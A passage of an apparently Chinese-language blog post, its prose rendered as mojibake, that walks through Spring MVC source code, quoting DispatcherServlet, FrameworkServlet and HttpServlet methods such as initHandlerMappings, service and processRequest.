initRequestToViewNameTranslator(context);</span><br><span class="line">			initViewResolvers(context);</span><br><span class="line">			initFlashMapManager(context);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>onRefreshæ–¹æ³•ä¸­åˆè°ƒç”¨äº†initStrategiesæ–¹æ³•ï¼Œåœ¨è¿™ä¸ªæ–¹æ³•ä¸­è¿›è¡Œäº†å¤§é‡çš„åˆå§‹åŒ–å·¥ä½œã€‚</p>
<p>è§†å›¾è§£æå™¨å’ŒHandlerMappingséƒ½æ˜¯åœ¨è¿™ä¸ªæ–¹æ³•ä¸­åˆå§‹åŒ–çš„ã€‚</p>
<p>é‡ç‚¹çœ‹ä¸€ä¸‹initHandlerMappingsæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯åˆå§‹åŒ–urlæ˜ å°„çš„</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Initialize the HandlerMappings used by this class.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;If no HandlerMapping beans are defined in the BeanFactory for this namespace,</span></span><br><span class="line"><span class="comment">	 * we default to BeanNameUrlHandlerMapping.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initHandlerMappings</span><span class="params">(ApplicationContext context)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.handlerMappings = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.detectAllHandlerMappings) &#123;</span><br><span class="line">			<span class="comment">// Find all HandlerMappings in the ApplicationContext, including ancestor contexts.</span></span><br><span class="line">			Map&lt;String, HandlerMapping&gt; matchingBeans =</span><br><span class="line">					BeanFactoryUtils.beansOfTypeIncludingAncestors(context, HandlerMapping<span class="class">.<span class="keyword">class</span>, <span class="title">true</span>, <span class="title">false</span>)</span>;</span><br><span class="line">			<span class="keyword">if</span> (!matchingBeans.isEmpty()) &#123;</span><br><span class="line">				<span class="keyword">this</span>.handlerMappings = <span class="keyword">new</span> ArrayList&lt;HandlerMapping&gt;(matchingBeans.values());</span><br><span class="line">				<span class="comment">// We keep HandlerMappings in sorted order.</span></span><br><span class="line">				AnnotationAwareOrderComparator.sort(<span class="keyword">this</span>.handlerMappings);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				HandlerMapping hm = context.getBean(HANDLER_MAPPING_BEAN_NAME, HandlerMapping<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">				<span class="keyword">this</span>.handlerMappings = Collections.singletonList(hm);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span> (NoSuchBeanDefinitionException ex) &#123;</span><br><span class="line">				<span class="comment">// Ignore, we'll add a default HandlerMapping later.</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Ensure we have at least one HandlerMapping, by registering</span></span><br><span class="line">		<span class="comment">// a default HandlerMapping if no other mappings are found.</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.handlerMappings == <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">this</span>.handlerMappings = getDefaultStrategies(context, HandlerMapping<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">			<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">				logger.debug(<span class="string">"No HandlerMappings found in servlet '"</span> + getServletName() + <span class="string">"': using default"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>  å…¶æ ¹æ® this.detectAllHandlerMappings çš„å€¼æ¥ç¡®å®šæ˜¯å¦æ‰«æç¥–å…ˆå®šä¹‰çš„handlermappingsï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰é…ç½®çš„è¯ï¼Œå°±ä¼šä½¿ç”¨é»˜è®¤çš„HandlerMapping<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Detect all HandlerMappings or just expect "handlerMapping" bean? */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> detectAllHandlerMappings = <span class="keyword">true</span>;</span><br></pre></td></tr></table></figure></p>
<h3 id="serviceæ–¹æ³•"><a href="#serviceæ–¹æ³•" class="headerlink" title="serviceæ–¹æ³•"></a>serviceæ–¹æ³•</h3><p>servletæ¥å£ä¸­å¦å¤–ä¸€ä¸ªé‡è¦çš„æ–¹æ³•å«åš<code>service</code></p>
<p><code>service</code>æ–¹æ³•æœ€æ—©æ˜¯åœ¨<code>HttpServlet</code>ç±»ä¸­å®ç°çš„ï¼Œä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Dispatches client requests to the protected</span></span><br><span class="line"><span class="comment">     * &lt;code&gt;service&lt;/code&gt; method. There's no need to</span></span><br><span class="line"><span class="comment">     * override this method.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> req   the &#123;<span class="doctag">@link</span> HttpServletRequest&#125; object that</span></span><br><span class="line"><span class="comment">     *                  contains the request the client made of</span></span><br><span class="line"><span class="comment">     *                  the servlet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> res   the &#123;<span class="doctag">@link</span> HttpServletResponse&#125; object that</span></span><br><span class="line"><span class="comment">     *                  contains the response the servlet returns</span></span><br><span class="line"><span class="comment">     *                  to the client                                </span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@exception</span> IOException   if an input or output error occurs</span></span><br><span class="line"><span class="comment">     *                              while the servlet is handling the</span></span><br><span class="line"><span class="comment">     *                              HTTP request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@exception</span> ServletException  if the HTTP request cannot</span></span><br><span class="line"><span class="comment">     *                                  be handled</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> javax.servlet.Servlet#service</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest req, ServletResponse res)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        HttpServletRequest  request;</span><br><span class="line">        HttpServletResponse response;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(req <span class="keyword">instanceof</span> HttpServletRequest &amp;&amp;</span><br><span class="line">                res <span class="keyword">instanceof</span> HttpServletResponse)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ServletException(<span class="string">"non-HTTP request or response"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        request = (HttpServletRequest) req;</span><br><span class="line">        response = (HttpServletResponse) res;</span><br><span class="line"></span><br><span class="line">        service(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>å®ƒåˆè°ƒç”¨è‡ªèº«çš„ä¸€ä¸ª<code>service</code>æ–¹æ³•:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Receives standard HTTP requests from the public</span></span><br><span class="line"><span class="comment">    * &lt;code&gt;service&lt;/code&gt; method and dispatches</span></span><br><span class="line"><span class="comment">    * them to the &lt;code&gt;do&lt;/code&gt;&lt;i&gt;XXX&lt;/i&gt; methods defined in</span></span><br><span class="line"><span class="comment">    * this class. This method is an HTTP-specific version of the</span></span><br><span class="line"><span class="comment">    * &#123;<span class="doctag">@link</span> javax.servlet.Servlet#service&#125; method. There's no</span></span><br><span class="line"><span class="comment">    * need to override this method.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> req   the &#123;<span class="doctag">@link</span> HttpServletRequest&#125; object that</span></span><br><span class="line"><span class="comment">    *                  contains the request the client made of</span></span><br><span class="line"><span class="comment">    *                  the servlet</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> resp  the &#123;<span class="doctag">@link</span> HttpServletResponse&#125; object that</span></span><br><span class="line"><span class="comment">    *                  contains the response the servlet returns</span></span><br><span class="line"><span class="comment">    *                  to the client                                </span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@exception</span> IOException   if an input or output error occurs</span></span><br><span class="line"><span class="comment">    *                              while the servlet is handling the</span></span><br><span class="line"><span class="comment">    *                              HTTP request</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@exception</span> ServletException  if the HTTP request</span></span><br><span class="line"><span class="comment">    *                                  cannot be handled</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@see</span> javax.servlet.Servlet#service</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span></span><br><span class="line"><span class="function">       <span class="keyword">throws</span> ServletException, IOException</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       String method = req.getMethod();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (method.equals(METHOD_GET)) &#123;</span><br><span class="line">           <span class="keyword">long</span> lastModified = getLastModified(req);</span><br><span class="line">           <span class="keyword">if</span> (lastModified == -<span class="number">1</span>) &#123;</span><br><span class="line">               <span class="comment">// servlet doesn't support if-modified-since, no reason</span></span><br><span class="line">               <span class="comment">// to go through further expensive logic</span></span><br><span class="line">               doGet(req, resp);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">long</span> ifModifiedSince = req.getDateHeader(HEADER_IFMODSINCE);</span><br><span class="line">               <span class="keyword">if</span> (ifModifiedSince &lt; lastModified) &#123;</span><br><span class="line">                   <span class="comment">// If the servlet mod time is later, call doGet()</span></span><br><span class="line">                   <span class="comment">// Round down to the nearest second for a proper compare</span></span><br><span class="line">                   <span class="comment">// A ifModifiedSince of -1 will always be less</span></span><br><span class="line">                   maybeSetLastModified(resp, lastModified);</span><br><span class="line">                   doGet(req, resp);</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(METHOD_HEAD)) &#123;</span><br><span class="line">           <span class="keyword">long</span> lastModified = getLastModified(req);</span><br><span class="line">           maybeSetLastModified(resp, lastModified);</span><br><span class="line">           doHead(req, resp);</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(METHOD_POST)) &#123;</span><br><span class="line">           doPost(req, resp);</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(METHOD_PUT)) &#123;</span><br><span class="line">           doPut(req, resp);</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(METHOD_DELETE)) &#123;</span><br><span class="line">           doDelete(req, resp);</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(METHOD_OPTIONS)) &#123;</span><br><span class="line">           doOptions(req,resp);</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(METHOD_TRACE)) &#123;</span><br><span class="line">           doTrace(req,resp);</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">//</span></span><br><span class="line">           <span class="comment">// Note that this means NO servlet supports whatever</span></span><br><span class="line">           <span class="comment">// method was requested, anywhere on this server.</span></span><br><span class="line">           <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">           String errMsg = lStrings.getString(<span class="string">"http.method_not_implemented"</span>);</span><br><span class="line">           Object[] errArgs = <span class="keyword">new</span> Object[<span class="number">1</span>];</span><br><span class="line">           errArgs[<span class="number">0</span>] = method;</span><br><span class="line">           errMsg = MessageFormat.format(errMsg, errArgs);</span><br><span class="line"></span><br><span class="line">           resp.sendError(HttpServletResponse.SC_NOT_IMPLEMENTED, errMsg);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
<p>è¿™æ®µä»£ç å°±æ˜¯æ ¹æ®è¯·æ±‚çš„ç±»å‹è°ƒç”¨ç›¸åº”çš„å¤„ç†æ–¹æ³•</p>
<p>è¿™ä¸ªæ–¹æ³•åˆåœ¨<code>FrameWorkServlet</code>ä¸­è¢«é‡å†™ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Override the parent class implementation in order to intercept PATCH requests.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (HttpMethod.PATCH.matches(request.getMethod())) &#123;</span><br><span class="line">    processRequest(request, response);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">super</span>.service(request, response);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åˆå¢åŠ äº†ä¸€ä¸ªå¤„ç†PATCHè¯·æ±‚çš„æ–¹æ³•ï¼Œå…¶ä»–çš„è¿˜æ˜¯è°ƒç”¨<code>HttpServlet</code>çš„å®ç°ã€‚</p>
<p>åŒæ—¶ï¼Œ<code>FrameWorkServlet</code>åˆå°†<code>HttpServlet</code>ä¸­å¯¹åº”çš„å„ç§HTTPè¯·æ±‚çš„æ–¹æ³•éƒ½è¿›è¡Œäº†é‡å†™ï¼Œå¦‚ä¸‹ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Delegate GET requests to processRequest/doService.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;Will also be invoked by HttpServlet's default implementation of &#123;<span class="doctag">@code</span> doHead&#125;,</span></span><br><span class="line"><span class="comment">	 * with a &#123;<span class="doctag">@code</span> NoBodyResponse&#125; that just captures the content length.</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> #doService</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@see</span> #doHead</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">			<span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">		processRequest(request, response);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>æ‰€æœ‰çš„è¯·æ±‚éƒ½è¢«å§”æ‰˜ç»™äº†<code>processRequest</code>è¿™ä¸ªæ–¹æ³•ï¼Œå®ƒçš„å®ç°å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Process this request, publishing an event regardless of the outcome.</span></span><br><span class="line"><span class="comment">	 * &lt;p&gt;The actual event handling is performed by the abstract</span></span><br><span class="line"><span class="comment">	 * &#123;<span class="doctag">@link</span> #doService&#125; template method.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">processRequest</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">			<span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">long</span> startTime = System.currentTimeMillis();</span><br><span class="line">		Throwable failureCause = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">		LocaleContext previousLocaleContext = LocaleContextHolder.getLocaleContext();</span><br><span class="line">		LocaleContext localeContext = buildLocaleContext(request);</span><br><span class="line"></span><br><span class="line">		RequestAttributes previousAttributes = RequestContextHolder.getRequestAttributes();</span><br><span class="line">		ServletRequestAttributes requestAttributes = buildRequestAttributes(request, response, previousAttributes);</span><br><span class="line"></span><br><span class="line">		WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);</span><br><span class="line">		asyncManager.registerCallableInterceptor(FrameworkServlet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>(), <span class="title">new</span> <span class="title">RequestBindingInterceptor</span>())</span>;</span><br><span class="line"></span><br><span class="line">		initContextHolders(request, localeContext, requestAttributes);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			doService(request, response);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (ServletException ex) &#123;</span><br><span class="line">			failureCause = ex;</span><br><span class="line">			<span class="keyword">throw</span> ex;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">			failureCause = ex;</span><br><span class="line">			<span class="keyword">throw</span> ex;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">			failureCause = ex;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> NestedServletException(<span class="string">"Request processing failed"</span>, ex);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">finally</span> &#123;</span><br><span class="line">			resetContextHolders(request, previousLocaleContext, previousAttributes);</span><br><span class="line">			<span class="keyword">if</span> (requestAttributes != <span class="keyword">null</span>) &#123;</span><br><span class="line">				requestAttributes.requestCompleted();</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">				<span class="keyword">if</span> (failureCause != <span class="keyword">null</span>) &#123;</span><br><span class="line">					<span class="keyword">this</span>.logger.debug(<span class="string">"Could not complete request"</span>, failureCause);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">						logger.debug(<span class="string">"Leaving response open for concurrent processing"</span>);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> &#123;</span><br><span class="line">						<span class="keyword">this</span>.logger.debug(<span class="string">"Successfully completed request"</span>);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			publishRequestHandledEvent(request, response, startTime, failureCause);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸Šè¿°ä»£ç çš„å¼‚å¸¸å¤„ç†å¾ˆå€¼å¾—å€Ÿé‰´ï¼Œä¸Šè¿°ä»£ç ä¸­<code>doService(request, response)</code>æ˜¯æ ¸å¿ƒã€‚</p>
<p>å®ƒæ˜¯<code>FrameWorkServlet</code>ä¸­å®šä¹‰çš„ä¸€ä¸ªæ¥å£ï¼Œå®ƒåœ¨<code>DispatcherServlet</code>ä¸­è¢«å®ç°ã€‚<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Subclasses must implement this method to do the work of request handling,</span></span><br><span class="line"><span class="comment"> * receiving a centralized callback for GET, POST, PUT and DELETE.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;The contract is essentially the same as that for the commonly overridden</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> doGet&#125; or &#123;<span class="doctag">@code</span> doPost&#125; methods of HttpServlet.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;This class intercepts calls to ensure that exception handling and</span></span><br><span class="line"><span class="comment"> * event publication takes place.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> request current HTTP request</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> response current HTTP response</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception in case of any kind of processing failure</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> javax.servlet.http.HttpServlet#doGet</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> javax.servlet.http.HttpServlet#doPost</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">doService</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> Exception</span>;</span><br></pre></td></tr></table></figure></p>
<p><code>DispatcherServlet</code>ä¸­çš„<code>doService</code>æ¥å£ä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Exposes the DispatcherServlet-specific request attributes and delegates to &#123;<span class="doctag">@link</span> #doDispatch&#125;</span></span><br><span class="line"><span class="comment">	 * for the actual dispatching.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doService</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		